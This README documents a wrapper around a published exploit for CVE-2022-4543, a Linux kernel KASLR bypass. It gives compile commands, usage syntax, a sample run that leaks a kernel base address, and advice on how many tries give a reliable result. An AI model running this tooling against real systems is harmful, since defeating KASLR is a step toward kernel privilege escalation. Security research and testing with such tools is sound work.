# cve-2022-4543-wrapper

## Introduction

This is a wrapper of willsroot's CVE-2022-4543 exploit to help you judge and get kernel base address.

## How to use

### Compile

Base on your demand(Optional):

```bash
gcc dekaslr.c --static -o dekaslr
g++ main.cpp --static -o main
```

For some OS, install static libc first.

### De-KASLR

```bash
./main
[*] Usage: ./binary dekaslr_path entry_SYSCALL_64_offset(in hex) max_loop
```

```bash
$ ./main ./dekaslr 0x100000 200
ffffffffa2600000: 53/200
```

After running both program, it will give you the most frequent address base on your offset.

In practice, the real kernel base address will appear more than 1/4 in total tries. Recommend more than 100 tries.

## References

- https://www.willsroot.io/2022/12/entrybleed.html
- https://access.redhat.com/security/cve/cve-2022-4543
